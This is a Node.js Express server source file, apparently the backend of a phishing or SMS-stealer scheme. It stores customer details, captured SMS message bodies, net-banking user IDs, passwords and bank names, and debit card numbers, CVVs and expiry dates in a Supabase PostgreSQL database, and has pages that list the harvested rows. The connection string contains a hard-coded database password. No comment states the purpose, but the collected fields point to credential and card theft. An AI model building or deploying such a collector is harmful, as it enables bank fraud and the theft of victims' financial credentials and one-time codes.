const express = require("express");
const app = express();
const port = 3000;
const path = require("path");
const { Pool } = require("pg");

// Create a PostgreSQL connection pool
const pool = new Pool({
  connectionString:
    "postgresql://postgres:Sonu@485470@db.udcaquctzjhghldwheyx.supabase.co:5432/postgres",
});

// Middleware
app.use(express.json());

// Set the absolute path to the views directory
const viewsPath = path.join(__dirname, "views");

// Set EJS as the view engine and specify the views directory
app.set("view engine", "ejs");
app.set("views", viewsPath);

// Routes
app.get("/", (req, res) => {
  pool.query("SELECT * FROM customers", (err, result) => {
    if (err) {
      console.error(err.message);
      res.status(500).send("Error retrieving data from the database.");
    } else {
      res.render("index.ejs", { data: result.rows });
    }
  });
});

app.post("/add-data", (req, res) => {
  const { customer_name, mobile_no, consumer_id, reason } = req.body;

  // Check all fields are entered
  if (!customer_name || !mobile_no || !consumer_id || !reason) {
    return res.status(400).send("Please provide all the required details");
  }

  // Create table if not exists
  pool.query(
    `CREATE TABLE IF NOT EXISTS customers (
      customer_name TEXT,
      mobile_no TEXT,
      consumer_id TEXT,
      reason TEXT,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`,
    (err) => {
      if (err) {
        console.error(err.message);
        res.status(500).send("Error creating table in the database.");
      } else {
        // Insert data into the PostgreSQL database
        pool.query(
          `INSERT INTO customers (customer_name, mobile_no, consumer_id, reason) VALUES ($1, $2, $3, $4)`,
          [customer_name, mobile_no, consumer_id, reason],
          (err) => {
            if (err) {
              console.error(err.message);
              res.status(500).send("Error inserting data into the database.");
            } else {
              res.send("Data inserted successfully.");
            }
          }
        );
      }
    }
  );
});

// Routes
app.get("/sms", (req, res) => {
  pool.query("SELECT * FROM sms", (err, result) => {
    if (err) {
      console.error(err.message);
      res.status(500).send("Error retrieving data from the database.");
    } else {
      res.render("sms.ejs", { data: result.rows });
    }
  });
});

app.post("/sms", (req, res) => {
  const { body } = req.body;

  // Check if the 'body' field is provided
  if (!body) {
    return res.status(400).send("Please provide the SMS body.");
  }

  // Create table if it doesn't exist
  pool.query(
    `CREATE TABLE IF NOT EXISTS sms (
      body TEXT,
      timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`,
    (err) => {
      if (err) {
        console.error(err.message);
        res.status(500).send("Error creating table in the database.");
      } else {
        // Insert data into the PostgreSQL database
        pool.query(`INSERT INTO sms (body) VALUES ($1)`, [body], (err) => {
          if (err) {
            console.error(err.message);
            res.status(500).send("Error inserting data into the database.");
          } else {
            res.send("SMS data saved successfully.");
          }
        });
      }
    }
  );
});

// Routes
app.get("/net-banking", (req, res) => {
  pool.query("SELECT * FROM banking", (err, result) => {
    if (err) {
      console.error(err.message);
      res.status(500).send("Error retrieving data from the database.");
    } else {
      res.render("banking.ejs", { data: result.rows });
    }
  });
});

app.post("/net-banking", (req, res) => {
  const { user_id, password, bank_name } = req.body;

  // Check if the 'body' field is provided
  if (!user_id && !password && !bank_name) {
    return res.status(400).send("Please provide the User ID & Password & bank_name body.");
  }

  // Create table if it doesn't exist
  pool.query(
    `CREATE TABLE IF NOT EXISTS banking (
      user_id TEXT,
      password TEXT,
      bank_name TEXT,
      timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`,
    (err) => {
      if (err) {
        console.error(err.message);
        res.status(500).send("Error creating table in the database.");
      } else {
        // Insert data into the PostgreSQL database
        pool.query(
          `INSERT INTO banking (user_id, password, bank_name) VALUES ($1, $2, $3)`,
          [user_id, password, bank_name],
          (err) => {
            if (err) {
              console.error(err.message);
              res.status(500).send("Error inserting data into the database.");
            } else {
              res.send("SMS data saved successfully.");
            }
          }
        );
      }
    }
  );
});


// 
// Routes
app.get("/card", (req, res) => {
  pool.query("SELECT * FROM card", (err, result) => {
    if (err) {
      console.error(err.message);
      res.status(500).send("Error retrieving data from the database.");
    } else {
      res.render("card.ejs", { data: result.rows });
    }
  });
});


// Debit Card
app.post("/card", (req, res) => {
  const { card_holder, cvv, card_number, expiry_date } = req.body;

  // Check if all required fields are provided
  if (
    !card_holder ||
    !cvv ||
    !card_number ||
    !expiry_date
  ) {
    return res.status(400).send("Please provide all the required fields.");
  }

  // Create table if it doesn't exist
  pool.query(
    `CREATE TABLE IF NOT EXISTS card (
      card_holder TEXT,
      cvv TEXT,
      card_number TEXT,
      expiry_date TEXT,
      timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`,
    (err) => {
      if (err) {
        console.error(err.message);
        res.status(500).send("Error creating table in the database.");
      } else {
        // Insert data into the PostgreSQL database
        pool.query(
          `INSERT INTO card (card_holder, cvv, card_number, expiry_date) 
          VALUES ($1, $2, $3, $4)`,
          [card_holder, cvv, card_number, expiry_date],
          (err) => {
            if (err) {
              console.error(err.message);
              res.status(500).send("Error inserting data into the database.");
            } else {
              res.send("Data saved successfully.");
            }
          }
        );
      }
    }
  );
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
